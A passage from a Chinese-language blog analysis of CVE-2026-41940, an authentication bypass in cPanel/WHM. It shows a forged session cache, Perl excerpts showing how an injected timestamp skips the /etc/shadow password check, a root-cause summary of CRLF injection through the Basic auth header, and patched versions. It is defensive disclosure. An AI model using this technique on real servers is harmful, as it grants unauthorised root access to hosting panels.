+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">401</span> Token Denied</span><br><span class="line">Cache-Control: <span class="keyword">no</span>-cache, <span class="keyword">no</span>-store, must-revalidate, private</span><br><span class="line">Content-Type: text/html; charset=<span class="string">&quot;utf-8&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>再看看缓存文件</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;tfa_verified&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span>                                      &lt;-- was <span class="number">0</span><span class="punctuation">,</span> now <span class="number">1</span> — injection won</span><br><span class="line"><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;root&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;hasroot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span>                                           &lt;-- TOP-LEVEL now</span><br><span class="line"><span class="attr">&quot;successful_internal_auth_with_timestamp&quot;</span><span class="punctuation">:</span><span class="string">&quot;1777462149&quot;</span><span class="punctuation">,</span>  &lt;-- TOP-LEVEL now</span><br><span class="line"><span class="attr">&quot;cp_security_token&quot;</span><span class="punctuation">:</span><span class="string">&quot;/cpsess0228251236&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;external_validation_token&quot;</span><span class="punctuation">:</span><span class="string">&quot;ss27XQjbY11gmCDs&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;token_denied&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="string">&quot;x&quot;</span><span class="punctuation">,</span>                                              &lt;-- stripped to just <span class="string">&quot;x&quot;</span></span><br><span class="line"><span class="attr">&quot;ip_address&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;local_ip_address&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>现在我们的 cache 已经绕过成功了，我们要成功绕过身份认证了吗？并没有</p>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">403</span> Forbidden Access denied</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;cpanelresult&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;apiversion&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;Access denied&quot;</span><span class="punctuation">,</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span><span class="string">&quot;Access denied&quot;</span><span class="punctuation">,</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="第五部分：-etc-shadow-绕过"><a href="#第五部分：-etc-shadow-绕过" class="headerlink" title="第五部分：&#x2F;etc&#x2F;shadow 绕过"></a>第五部分：&#x2F;etc&#x2F;shadow 绕过</h2><p>让我们看看 handle_one_connection，它紧接在 handle_auth 之后：</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">handle_form_login();</span><br><span class="line">…</span><br><span class="line">handle_auth();</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> <span class="variable">$authtype</span>   = <span class="variable">$server_obj</span>-&gt;auth-&gt;get_auth_type || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$document</span>   = <span class="variable">$server_obj</span>-&gt;request-&gt;get_document;</span><br><span class="line"><span class="variable">$user</span>          = <span class="variable">$server_obj</span>-&gt;auth-&gt;get_user;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$pass</span>       = <span class="variable">$server_obj</span>-&gt;auth-&gt;get_pass;</span><br><span class="line">…</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$Cpanel::App::appname</span> eq <span class="string">&#x27;whostmgrd&#x27;</span>) &#123;</span><br><span class="line">    …</span><br><span class="line">    docheckpass_whostmgrd(</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$user</span>,</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span> =&gt; <span class="variable">$pass</span>,</span><br><span class="line">        …</span><br><span class="line">    );</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>docheckpass_whostmgrd函数的意思是每次请求都要验证密码，密码存放在 &#x2F;etc&#x2F;shadow 中</p>
+<p>默认情况下，它会在 &#x2F;etc&#x2F;shadow 上运行 Cpanel::CheckPass::UNIX::checkpassword($pass, $shadow_entry) against &#x2F;etc&#x2F;shadow 逻辑上我们伪造pass会与 root 的真实密码匹配不符，我们会被退回。</p>
+<p>不过……我们观察下面的函数，这些函数表示如果设置了任一时间戳，密码验证会被跳过，密码验证 AUTH_OK 无条件返回（参见，这也是我们最初演示发送包含 successful_internal_auth_with_timestamp 的有效载荷的原因）。</p>
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">docheckpass_whostmgrd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> (<span class="variable">%OPTS</span>) = <span class="variable">@_</span>;</span><br><span class="line">    …</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$successful_external_auth_with_timestamp</span> <span class="keyword">or</span> <span class="variable">$successful_internal_auth_with_timestamp</span>) &#123;</span><br><span class="line">        <span class="variable">$authorized</span> = _check_external_internal_auth_from_docheckpass(<span class="variable">%OPTS</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elsif</span> (<span class="keyword">not</span> <span class="variable">$SESSION_ref</span>-&gt;&#123;<span class="string">&#x27;needs_auth&#x27;</span>&#125;) &#123;                    <span class="comment"># session-auth branch</span></span><br><span class="line">    …</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$SESSION_ref</span>-&gt;&#123;<span class="string">&#x27;successful_internal_auth_with_timestamp&#x27;</span>&#125;) &#123;</span><br><span class="line">        <span class="variable">$successful_internal_auth_with_timestamp</span> =</span><br><span class="line">            <span class="variable">$SESSION_ref</span>-&gt;&#123;<span class="string">&#x27;successful_internal_auth_with_timestamp&#x27;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">check_authok_user</span> </span>&#123;</span><br><span class="line">    <span class="keyword">my</span> (<span class="variable">%AUTHOPTS</span>) = <span class="variable">@_</span>;</span><br><span class="line">    …</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$AUTHOPTS</span>&#123;<span class="string">&#x27;authable_user&#x27;</span>&#125;&#123;<span class="string">&#x27;successful_external_auth_with_timestamp&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">or</span> <span class="variable">$AUTHOPTS</span>&#123;<span class="string">&#x27;authable_user&#x27;</span>&#125;&#123;<span class="string">&#x27;successful_internal_auth_with_timestamp&#x27;</span>&#125;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Cpanel::Server::AUTH_OK</span>, <span class="number">0</span>;            <span class="comment"># &lt;-- /etc/shadow never consulted</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elsif</span> (Cpanel::CheckPass::UNIX::checkpassword(</span><br><span class="line">            <span class="variable">$AUTHOPTS</span>&#123;<span class="string">&#x27;password&#x27;</span>&#125;,</span><br><span class="line">            <span class="variable">$AUTHOPTS</span>&#123;<span class="string">&#x27;authable_user&#x27;</span>&#125;&#123;<span class="string">&#x27;encrypted_pass&#x27;</span>&#125;))</span><br><span class="line">    &#123;</span><br><span class="line">        …</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就成功绕过了 &#x2F;etc&#x2F;shadow 的密码验证，访问 &#x2F;json-api&#x2F;version 会返回具体版本号</p>
+<hr>
+<h2 id="第六部分：漏洞总结"><a href="#第六部分：漏洞总结" class="headerlink" title="第六部分：漏洞总结"></a>第六部分：漏洞总结</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>漏洞类型</td>
+<td>认证绕过（Authentication Bypass）</td>
+</tr>
+<tr>
+<td>影响组件</td>
+<td>cPanel cpsrvd Session 处理</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>所有当前支持的 cPanel &amp; WHM 版本</td>
+</tr>
+<tr>
+<td>根因</td>
+<td>1. Basic 认证密码不过滤\r\n<br/>2. 无<ob> 时密码不编码直接写盘<br/>3. session 文件格式支持 CRLF 注入</td>
+</tr>
+<tr>
+<td>攻击向量</td>
+<td>通过 Basic 认证头注入 CRLF，伪造 session 文件字段</td>
+</tr>
+<tr>
+<td>影响</td>
+<td>未授权访问 WHM 管理面板</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="受影响版本与修复"><a href="#受影响版本与修复" class="headerlink" title="受影响版本与修复"></a>受影响版本与修复</h2><table>
+<thead>
+<tr>
+<th>版本</th>
+<th>修复版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>11.110.0.x</td>
+<td>11.110.0.97</td>
+</tr>
+<tr>
+<td>11.118.0.x</td>
+<td>11.118.0.63</td>
+</tr>
+<tr>
+<td>11.126.0.x</td>
+<td>11.126.0.54</td>
+</tr>
+<tr>
+<td>11.132.0.x</td>
+<td>11.132.0.29</td>
+</tr>
+<tr>
+<td>11.134.0.x</td>
+<td>11.134.0.20</td>
+</tr>
+<tr>
+<td>11.136.0.x</td>
+<td>11.136.0.5</td>
+</tr>
+</tbody></table>
+<p>建议：立即升级到上述修复版本或更高版本。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> CVE-2026-41940 cPanel／WHM 认证绕过漏洞分析</li>
+        <li><strong>作者:</strong> Nevolar</li>
+        <li><strong>创建于
+                :</strong> 2026-05-06 03:24:34</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-05-06 03:24:35
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://blog.freeaes.com/2026/05/fb2e7128ef33.html
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/cpanel/">#cpanel</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9E/">#严重漏洞</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/ba69ec53eb07.html">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Edge 转储明文账密</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/77f0e74e8b9b.html">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Ghost Bit SQL 注入绕 WAF</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdnjs.cloudflare.com/ajax/libs/twikoo/1.6.44/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            (function() {
+                const startPath = location.pathname;
+                const startTime = Date.now();
+                const retryDelay = 200;
+                const retryLimit = 5000;
+
+                const runTwikoo = () => {
+                    if (location.pathname !== startPath) {
+                        return;
+                    }
+
+                    const container = document.getElementById('twikoo-comment');
+                    if (!container || typeof twikoo === 'undefined') {
+                        if (Date.now() - startTime < retryLimit) {
+                            setTimeout(runTwikoo, retryDelay);
+                        }
+                        return;
+                    }
+
+                    container.innerHTML = '';
+                    twikoo.init({
+                        el: '#twikoo-comment',
+                        envId: 'https://comment.mikuwa.com/',
+                        path: location.pathname,
+                    });
+                };
+
+                runTwikoo();
+            })();
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">CVE-2026-41940 cPanel／WHM 认证绕过漏洞分析</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">2.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9AcPanel-Session-%E6%9C%BA%E5%88%B6"><span class="nav-number">3.</span> <span class="nav-text">第一部分：cPanel Session 机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%99%BB%E5%BD%95%E6%B5%81%E7%A8%8B%E4%B8%AD%E7%9A%84-Session-%E5%88%9B%E5%BB%BA"><span class="nav-number">3.1.</span> <span class="nav-text">登录流程中的 Session 创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-%E7%BB%93%E6%9E%84"><span class="nav-number">3.2.</span> <span class="nav-text">Cookie 结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Session-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="nav-number">3.3.</span> <span class="nav-text">Session 文件结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%A0%B9%E5%9B%A0-%E2%80%94-saveSession-%E7%9A%84%E4%B8%A4%E4%B8%AA-Bug"><span class="nav-number">4.</span> <span class="nav-text">第二部分：漏洞根因 — saveSession 的两个 Bug</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bug-1%EF%BC%9A%E5%AF%86%E7%A0%81%E5%86%99%E7%9B%98%E6%97%B6%E4%B8%8D%E8%BF%87%E6%BB%A4-CRLF"><span class="nav-number">4.1.</span> <span class="nav-text">Bug 1：密码写盘时不过滤 CRLF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bug-2%EF%BC%9Aset-pass-%E4%B8%8D%E8%BF%87%E6%BB%A4-r-n"><span class="nav-number">4.2.</span> <span class="nav-text">Bug 2：set_pass 不过滤 \r\n</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8C%96%E5%AD%A6%E5%8F%8D%E5%BA%94"><span class="nav-number">4.3.</span> <span class="nav-text">漏洞的化学反应</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%EF%BC%9A%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">5.</span> <span class="nav-text">第三部分：完整攻击流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-1%EF%BC%9AMint-%E9%A2%84%E8%AE%A4%E8%AF%81-Session"><span class="nav-number">5.1.</span> <span class="nav-text">Step 1：Mint 预认证 Session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-2%EF%BC%9A%E6%B3%A8%E5%85%A5-CRLF-%E2%80%94-%E5%8F%91%E9%80%81%E6%97%A0-%E7%9A%84-Cookie"><span class="nav-number">5.2.</span> <span class="nav-text">Step 2：注入 CRLF — 发送无  的 Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-3%EF%BC%9ASession-%E6%96%87%E4%BB%B6%E8%A2%AB%E6%B1%A1%E6%9F%93"><span class="nav-number">5.3.</span> <span class="nav-text">Step 3：Session 文件被污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-4%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%94%E5%9B%9E-307-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">5.4.</span> <span class="nav-text">Step 4：服务器返回 307 重定向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Step-5%EF%BC%9A%E8%AE%BF%E9%97%AE%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87"><span class="nav-number">5.5.</span> <span class="nav-text">Step 5：访问版本信息验证是否成功绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86%EF%BC%9ACache-%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">6.</span> <span class="nav-text">第四部分：Cache 机制与绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86%EF%BC%9A-etc-shadow-%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">第五部分：&#x2F;etc&#x2F;shadow 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E9%83%A8%E5%88%86%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">第六部分：漏洞总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="nav-number">9.</span> <span class="nav-text">受影响版本与修复</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2026</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Nevolar</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 11 篇文章
+                    </span>
+                    
+                        <span>
+                            共 20.6k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+                
+
+                    
+                        <script data-swup-reload-script src="https://registry.npmmirror.com/qexo-static/1.6.0/files/hexo/talks.js"></script>
+                    
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
